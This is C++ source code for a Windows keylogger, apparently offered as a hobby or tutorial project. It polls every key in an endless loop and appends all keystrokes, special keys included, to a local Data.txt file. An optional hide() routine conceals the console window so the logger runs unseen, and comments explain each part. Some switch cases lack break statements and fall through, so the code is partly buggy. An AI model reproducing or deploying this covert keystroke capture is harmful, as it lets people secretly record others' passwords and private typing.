#include <iostream>
#include <Windows.h> // Windows-specific header file - help in talking to Windows OS
#include <Winuser.h>
#include <fstream>
using namespace std;

void check(void); // function to check which key is pressed
void hide(void);  // function to hide our keylogger and run it in the background

int main()
{
	// hide();   //[Unrecommended] Uncomment the function if you want keylogger to run in the background
	check();
	return 0;
}

void check()
{
	// declaration
	char key;

	for (;;) // infinite loop i.e Keylogger will log the keys unless we terminate the program
	{
		for (key = 8; key <= 126; key++) // nested loop - range of characters we'll read ( range got from ASCII codes )
		{
			if (GetAsyncKeyState(key) == -32767) // check - we press any key
			{
				ofstream write("Data.txt", ios::app);
				// If the value of key is greater than 64 but lesser than 91
				// and the shift key is not pressed(written as !(GetAsyncKey(0x10)))
				// - where 0x10 is the hexadecimal notation for the Shift key
				// Then we will add 32 to the previous key values.

				if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10)))  // shift key is not pressed along with key
				{
					key += 32;
					write << key;
					write.close();
					break;
				}

				else if ((key > 64) && (key < 91)) // shift key is pressed along with key
				{
					write << key;
					write.close();
					break;
				}

				else //key other than alphabetical key is pressed
				{
					switch (key)
					{
					case 27:
						write << "<Esc>";
					case 127:
						write << "<DEL>";

					case 48:
					{
						if (GetAsyncKeyState(0x10)) // Shift + 0
							write << ")";
						else
							write << "0";
					}
					break;

					case 49:
					{
						if (GetAsyncKeyState(0x10)) // shift + 1
							write << "!";
						else
							write << "1";
					}
					break;

					case 50:
					{
						if (GetAsyncKeyState(0x10))
							write << "@";
						else
							write << "2";
					}
					break;

					case 51:
					{
						if (GetAsyncKeyState(0x10))
							write << "#";
						else
							write << "3";
					}
					break;

					case 52:
					{
						if (GetAsyncKeyState(0x10))
							write << "$";
						else
							write << "4";
					}
					break;

					case 53:
					{
						if (GetAsyncKeyState(0x10))
							write << "%";
						else
							write << "5";
					}
					break;

					case 54:
					{
						if (GetAsyncKeyState(0x10))
							write << "^";
						else
							write << "6";
					}
					break;

					case 55:
					{
						if (GetAsyncKeyState(0x10))
							write << "&";
						else
							write << "7";
					}
					break;

					case 56:
					{
						if (GetAsyncKeyState(0x10))
							write << "*";
						else
							write << "8";
					}
					break;

					case 57:
					{
						if (GetAsyncKeyState(0x10))
							write << "(";
						else
							write << "9";
					}
					break;

					case VK_SPACE: // virtual keys (Space bar key)
						write << " ";
						break;

					case VK_RETURN: // Enter key
						write << "\n";
						break;

					case VK_SHIFT: // shift key
						write << "#SHIFT#";
						break;

					case VK_BACK: // Backspace key
						write << "\b";
						break;

					case VK_RBUTTON: // Right Click
						write << "#R_CLICK#";
						break;

					case VK_CAPITAL: //Caps Lock
						write << "#CAPS_LOCK#";
						break;

					case VK_TAB: //Tab
						write << "#TAB";
						break;

					case VK_UP: //Up key
						write << "#UP";
						break;

					case VK_DOWN: //Down key
						write << "#DOWN";
						break;

					case VK_LEFT: //left key
						write << "#LEFT";
						break;

					case VK_RIGHT: //right key
						write << "#RIGHT";
						break;

					case VK_CONTROL: //Control (Ctrl) key
						write << "#CONTROL";
						break;

					default: // Key other than above mentioned key is pressed
						write << key;
					}
				}
			}
		}
	}
}

void hide() //Hiding the console and running program in the background
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}